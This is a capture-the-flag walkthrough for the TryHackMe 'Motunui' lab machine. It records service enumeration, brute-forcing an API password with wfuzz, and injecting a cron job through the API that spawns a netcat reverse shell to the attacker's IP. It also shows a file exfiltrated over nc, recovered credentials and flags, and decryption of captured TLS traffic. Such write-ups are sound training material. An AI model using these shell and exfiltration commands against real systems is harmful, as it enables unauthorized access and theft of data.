## Table of contents
- Port Scan - Service discovery
- Pentesting services
- Getting a Shell
- Inside
- Exciltration
- Privilege escelation

## Port Scan -Service discovery
### Simple nmap scan
 
nmap -sC -sV -A 10.201.37.236

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-14 15:57 UTC
    Stats: 0:01:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.88% done; ETC: 15:58 (0:00:00 remaining)
    Nmap scan report for 10.201.37.236
    Host is up (0.032s latency).
    Not shown: 994 filtered tcp ports (no-response)
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 20:f4:43:ac:39:fe:94:13:7a:ad:3d:e6:5f:b4:7e:71 (RSA)
    |   256 49:8c:75:e1:78:e9:72:65:de:c9:14:74:0f:d4:1a:81 (ECDSA)
    |_  256 0b:b6:27:f9:ad:ed:22:a9:90:ac:9e:b3:85:1b:aa:96 (ED25519)
    80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
    3000/tcp open  ppp?
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     HTTP/1.1 404 Not Found
    |     Content-Security-Policy: default-src 'none'
    |     X-Content-Type-Options: nosniff
    |     Content-Type: text/html; charset=utf-8
    |     Content-Length: 174
    |     Date: Fri, 14 Nov 2025 15:57:47 GMT
    |     Connection: close
    |     <!DOCTYPE html>
    |     <html lang="en">
    |     <head>
    |     <meta charset="utf-8">
    |     <title>Error</title>
    |     </head>
    |     <body>
    |     <pre>Cannot GET /nice%20ports%2C/Tri%6Eity.txt%2ebak</pre>
    |     </body>
    |     </html>
    |   GetRequest: 
    |     HTTP/1.1 404 Not Found
    |     Content-Security-Policy: default-src 'none'
    |     X-Content-Type-Options: nosniff
    |     Content-Type: text/html; charset=utf-8
    |     Content-Length: 139
    |     Date: Fri, 14 Nov 2025 15:57:47 GMT
    |     Connection: close
    |     <!DOCTYPE html>
    |     <html lang="en">
    |     <head>
    |     <meta charset="utf-8">
    |     <title>Error</title>
    |     </head>
    |     <body>
    |     <pre>Cannot GET /</pre>
    |     </body>
    |     </html>
    |   HTTPOptions: 
    |     HTTP/1.1 404 Not Found
    |     Content-Security-Policy: default-src 'none'
    |     X-Content-Type-Options: nosniff
    |     Content-Type: text/html; charset=utf-8
    |     Content-Length: 143
    |     Date: Fri, 14 Nov 2025 15:57:47 GMT
    |     Connection: close
    |     <!DOCTYPE html>
    |     <html lang="en">
    |     <head>
    |     <meta charset="utf-8">
    |     <title>Error</title>
    |     </head>
    |     <body>
    |     <pre>Cannot OPTIONS /</pre>
    |     </body>
    |_    </html>
    5000/tcp open  ssl/http    Node.js (Express middleware)
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: organizationName=Motunui/stateOrProvinceName=Motunui/countryName=GB
    | Not valid before: 2020-08-03T14:58:59
    |_Not valid after:  2021-08-03T14:58:59
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | tls-alpn: 
    |_  http/1.1
    | tls-nextprotoneg: 
    |   http/1.1
    |_  http/1.0
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port3000-TCP:V=7.95%I=7%D=11/14%Time=69175185%P=x86_64-pc-linux-gnu%r(G
    SF:etRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
    SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
    SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20139\
    SF:r\nDate:\x20Fri,\x2014\x20Nov\x202025\x2015:57:47\x20GMT\r\nConnection:
    SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
    SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
    SF:annot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTTPOptions,16C,"HTTP/1
    SF:\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-src\x
    SF:20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20text
    SF:/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Fri,\x201
    SF:4\x20Nov\x202025\x2015:57:47\x20GMT\r\nConnection:\x20close\r\n\r\n<!DO
    SF:CTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8
    SF:\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x20/
    SF:</pre>\n</body>\n</html>\n")%r(FourOhFourRequest,18B,"HTTP/1\.1\x20404\
    SF:x20Not\x20Found\r\nContent-Security-Policy:\x20default-src\x20'none'\r\
    SF:nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20c
    SF:harset=utf-8\r\nContent-Length:\x20174\r\nDate:\x20Fri,\x2014\x20Nov\x2
    SF:02025\x2015:57:47\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
    SF:ml>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title
    SF:>Error</title>\n</head>\n<body>\n<pre>Cannot\x20GET\x20/nice%20ports%2C
    SF:/Tri%6Eity\.txt%2ebak</pre>\n</body>\n</html>\n");
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose|phone|specialized
    Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (95%), Google Android 10.X (90%), Crestron 2-Series (86%)
    OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series
    Aggressive OS guesses: Linux 4.15 (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 2.6.32 - 3.10 (91%), Android 9 - 10 (Linux 4.9 - 4.14) (90%), Linux 3.10 - 4.11 (90%), Linux 5.4 (88%), Linux 2.6.32 - 3.5 (86%), Crestron XPanel control system (86%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 3 hops
    Service Info: Host: MOTUNUI; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Host script results:
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
    |   Computer name: motunui
    |   NetBIOS computer name: MOTUNUI\x00
    |   Domain name: \x00
    |   FQDN: motunui
    |_  System time: 2025-11-14T15:58:25+00:00
    |_clock-skew: mean: -10s, deviation: 0s, median: -11s
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-time: 
    |   date: 2025-11-14T15:58:25
    |_  start_date: N/A
    |_nbstat: NetBIOS name: MOTUNUI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    TRACEROUTE (using port 445/tcp)
    HOP RTT      ADDRESS
    1   28.00 ms 10.6.0.1
    2   ...
    3   29.39 ms 10.201.37.236
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 105.84 seconds\


## Directory Bruteforcing

feroxbuster -u http://10.201.37.236 -w /usr/share/wordlists/dirb/common.txt
                                                                          
     ___  ___  __   __     __      __         __   ___
    
    403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
    404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
    200      GET      375l      964w    10918c http://10.201.37.236/index.html
    301      GET        9l       28w      319c http://10.201.37.236/javascript => http://10.201.37.236/javascript/
    200      GET       15l       74w     6147c http://10.201.37.236/icons/ubuntu-logo.png
    200      GET      375l      964w    10918c http://10.201.37.236/
    301      GET        9l       28w      326c http://10.201.37.236/javascript/jquery => http://10.201.37.236/javascript/jquery/
    200      GET    10253l    40948w   268026c http://10.201.37.236/javascript/jquery/jquery
    [####################] - 11s    13859/13859   0s      found:6       errors:0      
    [####################] - 8s      4614/4614    614/s   http://10.201.37.236/ 
    [####################] - 4s      4614/4614    1165/s  http://10.201.37.236/javascript/ 
    [####################] - 3s      4614/4614    1710/s  http://10.201.37.236/javascript/jquery/   

### Directory enumeration
Just some raw javascript

    "http://10.201.37.236/javascript/async/async"

## Smb enumeration

smbclient -L //10.201.37.236 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	traces          Disk      Network shared files
	IPC$            IPC       IPC Service (motunui server (Samba, Ubuntu))
    Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            MOTUNUI


smbclient //10.201.37.236/traces -N

    smb: \> ls
      .                                   D        0  Thu Jul  9 03:48:54 2020
      ..                                  D        0  Thu Jul  9 03:48:27 2020
      moana                               D        0  Thu Jul  9 03:50:12 2020
      maui                                D        0  Mon Aug  3 16:22:03 2020
      tui                                 D        0  Thu Jul  9 03:50:40 2020
    
    		19475088 blocks of size 1024. 11257912 blocks available
    smb: \> 
## Finding in smb

     maui/ticket_6746.pcapng
     
## Analysting it with wireshark

    We find a subdomain that hosts a virtual machine and its ip address http://192.168.236.130:8000/      dashboard.png

### Change /etc/hosts files

    10.201.37.236 d3v3lopm3nt.motunui.thm

## Brute-forcing directories for enumerating d3v3lopm3nt.motunui.thm

feroxbuster -u http://d3v3lopm3nt.motunui.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/ DirBuster-2007_directory-list-2.3-medium.txt -t 75
                                                                                       
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.13.0
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://d3v3lopm3nt.motunui.thm/
     🚩  In-Scope Url          │ d3v3lopm3nt.motunui.thm
     🚀  Threads               │ 75
     📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
     👌  Status Codes          │ All Status Codes!
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.13.0
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🔎  Extract Links         │ true
     🏁  HTTP methods          │ [GET]
     🔃  Recursion Depth       │ 4
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Management Menu™
    ──────────────────────────────────────────────────
    403      GET        9l       28w      288c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
    404      GET        9l       31w      285c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
    200      GET       10l       32w      248c http://d3v3lopm3nt.motunui.thm/
    301      GET        9l       28w      339c http://d3v3lopm3nt.motunui.thm/javascript => http://d3v3lopm3nt.motunui.thm/javascript/
    301      GET        9l       28w      333c http://d3v3lopm3nt.motunui.thm/docs => http://d3v3lopm3nt.motunui.thm/docs/
    301      GET        9l       28w      346c http://d3v3lopm3nt.motunui.thm/javascript/jquery => http://d3v3lopm3nt.motunui.thm/javascript/jquery/
    301      GET        9l       28w      345c http://d3v3lopm3nt.motunui.thm/javascript/async => http://d3v3lopm3nt.motunui.thm/javascript/async/
    200      GET    10253l    40948w   268026c http://d3v3lopm3nt.motunui.thm/javascript/jquery/jquery
    200      GET     1058l     3007w    32659c http://d3v3lopm3nt.motunui.thm/javascript/async/async
    [####################] - 6m   1102740/1102740 0s      found:7       errors:2858   
    [####################] - 4m    220545/220545  825/s   http://d3v3lopm3nt.motunui.thm/ 
    [####################] - 4m    220545/220545  823/s   http://d3v3lopm3nt.motunui.thm/javascript/ 
    [####################] - 4m    220545/220545  836/s   http://d3v3lopm3nt.motunui.thm/docs/ 
    [####################] - 4m    220545/220545  854/s   http://d3v3lopm3nt.motunui.thm/javascript/jquery/ 
    [####################] - 4m    220545/220545  1011/s  http://d3v3lopm3nt.motunui.thm/javascript/async/ 

### Enumeration with curl

curl http://d3v3lopm3nt.motunui.thm/docs/README.md
    # Documentation for the in-development API
    
    ##### [Changelog](CHANGELOG.md) | [Issues](ISSUES.md)
    
    Please do not distribute this documentation outside of the development team.
    
    ## Routes
    Find all of the routes [here](ROUTES.md).
    
   
curl http://d3v3lopm3nt.motunui.thm/docs/ROUTES.md
    # Routes
    
    The base URL for the api is `api.motunui.thm:3000/v2/`.
    
    ### `POST /login`
    Returns the hash for the specified user to be used for authorisation.
    #### Parameters
    - `username`
    - `password`
    #### Response (200)
    ```js
    {
    	"hash": String()
    }
    ```
    #### Response (401)
    ```js
    {
    	"error": "invalid credentials"
    }
    ```
    
    ### 🔐 `GET /jobs`
    Returns all the cron jobs running as the current user.
    #### Parameters
    - `hash`
    #### Response (200)
    ```js
    {
    	"jobs": Array()
    }
    ```
    #### Response (403)
    ```js
    {
    	"error": "you are unauthorised to view this resource"
    }
    ```
    
    ### 🔐 `POST /jobs`
    Creates a new cron job running as the current user.
    #### Parameters
    - `hash`
    #### Response (201)
    ```js
    {
    	"job": String()
    }
    ```
    #### Response (401)
    ```js
    {
    	"error": "you are unauthorised to view this resource"
    }
	```

### Changing /etc/hosts file again

    10.201.37.236 d3v3lopm3nt.motunui.thm
    10.201.37.236 api.motunui.thm

### More enumeration with curl

curl -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' -XPOST http://api.motunui.thm:3000/v2/login
    
    {"error":"invalid credentials"}


curl http://api.motunui.thm:3000/v1/login
    
    {"message":"please get maui to update these routes"}

### Pentesting services

## Bruteforcing user maui:island


wfuzz -c -H 'Content-Type: application/json' -d '{"username":"maui","password":"FUZZ"}' -w /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-45.txt --hh 31 -t 50 http://api.motunui.thm:3000/v2/login

    /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
      ********************************************************
      * Wfuzz 3.1.0 - The Web Fuzzer                         *
      ********************************************************
      
      Target: http://api.motunui.thm:3000/v2/login
      Total requests: 6163
      
      =====================================================================
      ID           Response   Lines    Word       Chars       Payload                            
      =====================================================================
      
      000004343:   200        0 L      1 W        19 Ch       "island"                           
      
      Total time: 0
      Processed Requests: 6163
      Filtered Requests: 6162
      Requests/sec.: 0

### Getting maui hash

curl -H 'Content-Type: application/json' -d '{"username":"maui","password":"island"}' -XPOST http://api.motunui.thm:3000/v2/login
    
    {"hash":"aXNsYW5k"}

### Getting a Shell

## Reverse shell

curl -H 'Content-Type: application/json' -d '{"hash":"aXNsYW5k","job":"* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.48.108 4050 >/tmp/f"}' -XPOST http://api.motunui.thm:3000/v2/jobs 

    {"job":"* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.48.108 4050 >/tmp/f"}

nc -lvnp 4050

    listening on [any] 4050 ...
    connect to [10.6.48.108] from (UNKNOWN) [10.201.37.236] 40122
    /bin/sh: 0: can't access tty; job control turned off
    $ 

## upgrading the shell

    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ^Z
    stty raw -echo
    fg
    export TERM=xterm

### Inside

## enumerating files and directories

    $ cat user.txt
    cat: user.txt: Permission denied
    $ cat read.me
    cat: read.me: No such file or directory
    $ cat read_me
    I know you've been on vacation and the last thing you want is me nagging you.
    
    But will you please consider not using the same password for all services? It puts us all at risk.
    
    I have started planning the new network design in packet tracer, and since you're 'the best engineer this island has seen', go find it and finish it.
    
    $ cd /home
    $ ls
    moana
    network
    $ ls -la network/
    total 28
    drwxr-xr-x 3 network network 4096 Jul  9  2020 .
    drwxr-xr-x 4 root    root    4096 Jul  7  2020 ..
    -rw------- 1 network network  246 Jul  7  2020 .bash_history
    -rw-r--r-- 1 network network  220 Jul  7  2020 .bash_logout
    -rw-r--r-- 1 network network 3771 Jul  7  2020 .bashrc
    -rw-r--r-- 1 network network  807 Jul  7  2020 .profile
    drwxrwxr-x 5 network network 4096 Jul  9  2020 traces

## Finding good files
find / -type f -iname '*pkt' -ls 2>/dev/null

       926350     76 -rwxrwxrwx   1 moana    moana       75918 Jul  9  2020 /etc/network.pkt

### Exciltration

## Sender

cat /etc/network.pkt | nc 10.6.48.108 4545

## 

nc -lvnp 4545 > network.pkt

## Opening the file we got in packet tracer we find a username and password (moana:H0wF4ri'LLG0)

    Switch#show running-config
    Building configuration...
    
    Current configuration : 1133 bytes
    !
    version 12.2
    no service timestamps log datetime msec
    no service timestamps debug datetime msec
    no service password-encryption
    !
    hostname Switch
    
    username moana privilege 1 password 0 H0wF4ri'LLG0
    
    spanning-tree mode pvst
    spanning-tree extend system-id
    !
    interface FastEthernet0/1
     --More-- 

### Privilege escelation

## we can login via ssh and retrieve the first flag
──(mrblue㉿kali)-[~/CTF/THM/Motunui]
└─$ ssh moana@api.motunui.thm

    moana@motunui:~$ ls
    read_me  user.txt
    moana@motunui:~$ id
    uid=1000(moana) gid=1000(moana) groups=1000(moana)
    moana@motunui:~$ cat user.txt 
    THM{m0an4_0f_M0tunu1}
    moana@motunui:~$ 

## more enumeration of file and directories
    moana@motunui:~$ find / -type f -name '*service' -group moana -ls 2>/dev/null
       665881      4 -rw-rw-r--   1 root     moana         204 Aug 20  2020 /etc/systemd/system/api.service
    moana@motunui:~$ cat /etc/systemd/system/api.service
    [Unit]
    Description=The API for Motunui
    [Service]
    User=www-data
    Group=www-data
    ExecStart=/usr/bin/node /var/www/api.motunui.thm/server.js
    Restart=always
    RestartSec=5
    [Install]
    WantedBy=multi-user.target

### Privilege escelation

## We find in /etc/ssl.txt, with this we can fully decrypt the traffic of the wireshark pcap file we had

tshark -r ticket_6746.pcapng -o "tls.keylog_file:ssl.txt" -Y "http || tls" -V > decrypted_traffic.txt

## password findings
    In the pcap you will find the password for root! (root:Pl3aseW0rk)

### last flag
THM{h34rT_r35T0r3d}




